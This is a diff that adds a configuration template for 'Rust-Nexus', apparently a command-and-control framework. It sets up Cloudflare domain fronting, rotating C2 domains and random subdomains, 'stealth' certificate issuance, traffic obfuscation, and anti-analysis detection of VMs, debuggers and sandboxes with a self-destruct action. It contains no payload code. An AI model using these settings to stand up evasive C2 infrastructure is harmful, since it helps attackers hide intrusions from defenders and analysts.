@@ -1,0 +1,176 @@
+# Rust-Nexus Configuration Template
+# Copy this file to nexus.toml and customize for your environment
+# NEVER commit nexus.toml with real credentials to version control
+
+[cloudflare]
+# Cloudflare API token - requires Zone:Edit and DNS:Edit permissions
+# Generate at: https://dash.cloudflare.com/profile/api-tokens
+api_token = "YOUR_CLOUDFLARE_API_TOKEN_HERE"
+
+# Zone ID for your domain
+# Find at: Cloudflare Dashboard -> Your Domain -> Overview (right sidebar)
+zone_id = "YOUR_ZONE_ID_HERE"
+
+# Your domain managed by Cloudflare
+domain = "your-domain.com"
+
+# Enable Cloudflare proxy for domain fronting (orange cloud)
+proxy_enabled = true
+
+# DNS record TTL in seconds
+ttl = 300
+
+# Geographic regions for load balancing
+geographic_regions = ["US", "EU", "APAC"]
+
+# Custom headers for domain fronting (optional)
+#[cloudflare.custom_headers]
+#"Host" = "legitimate-cdn-service.com"
+#"User-Agent" = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
+
+[letsencrypt]
+# Contact email for Let's Encrypt account
+contact_email = "your-email@example.com"
+
+# Challenge type - DNS-01 recommended for stealth
+challenge_type = "Dns01"
+
+# Days before expiration to renew certificates
+cert_renewal_days = 30
+
+# Enable wildcard certificate support
+wildcard_enabled = true
+
+# Let's Encrypt directory URL
+# Production: https://acme-v02.api.letsencrypt.org/directory  
+# Staging: https://acme-staging-v02.api.letsencrypt.org/directory
+acme_directory_url = "https://acme-v02.api.letsencrypt.org/directory"
+
+# Local certificate storage directory
+cert_storage_dir = "./certs"
+
+[origin_cert]
+# Paths to origin certificate files
+cert_path = "./certs/origin.crt"
+key_path = "./certs/origin.key"
+ca_cert_path = "./certs/origin_ca.crt"
+
+# Enable certificate pinning validation
+pin_validation = true
+
+# Certificate validity period in days
+validity_days = 365
+
+[grpc_server]
+# Server bind address
+bind_address = "0.0.0.0"
+
+# Server port (443 recommended for HTTPS masquerading)
+port = 8443
+
+# Enable mutual TLS authentication
+mutual_tls = true
+
+# Maximum concurrent connections
+max_connections = 1000
+
+# Connection timeout in seconds
+connection_timeout = 30
+
+# Keep-alive interval in seconds
+keepalive_interval = 60
+
+# Maximum message size in bytes (16MB)
+max_message_size = 16777216
+
+[domains]
+# Primary C2 domains
+primary_domains = [
+    "c2.your-domain.com",
+    "api.your-domain.com"
+]
+
+# Backup domains for failover
+backup_domains = [
+    "backup.your-domain.com",
+    "cdn.your-domain.com",
+    "static.your-domain.com"
+]
+
+# Domain rotation interval in hours
+rotation_interval = 24
+
+# Maximum number of concurrent subdomains
+max_subdomains = 10
+
+# Enable domain health monitoring
+health_monitoring = true
+
+# DNS resolution timeout in seconds
+dns_timeout = 5
+
+# Subdomain generation pattern
+[domains.subdomain_pattern]
+type = "Random"
+length = 8
+
+# Alternative patterns:
+# Dictionary pattern:
+# type = "Dictionary"
+# wordlist = "./wordlists/subdomains.txt"
+
+# Custom template pattern:
+# type = "Custom"  
+# template = "api-{random}-{timestamp}"
+
+[security]
+# Enable additional encryption layer beyond TLS
+additional_encryption = true
+
+# Encryption key for additional layer (leave empty for auto-generation)
+encryption_key = ""
+
+# Enable traffic obfuscation
+traffic_obfuscation = true
+
+# Anti-analysis configuration
+[security.anti_analysis]
+vm_detection = true
+debugger_detection = true
+sandbox_detection = true
+
+# Action when analysis environment detected
+[security.anti_analysis.detection_action]
+#type = "Exit"
+# Alternative actions:
+# type = "Sleep"
+# duration_seconds = 3600
+# type = "Deception"
+ type = "SelfDestruct"
+
+# Rate limiting configuration
+[security.rate_limiting]
+max_requests_per_minute = 60
+burst_size = 10
+per_ip_limiting = true
+
+# Logging configuration (optional)
+[logging]
+level = "info"  # debug, info, warn, error
+file_output = "./logs/nexus.log"
+console_output = true
+structured = true
+
+# Development/testing overrides (remove for production)
+[development]
+# Use Let's Encrypt staging for testing
+use_staging_ca = false
+
+# Skip certificate validation (DANGEROUS - testing only)
+skip_cert_validation = false
+
+# Enable debug features
+debug_mode = false
+
+# Use shorter timeouts for faster testing
+fast_timeouts = false
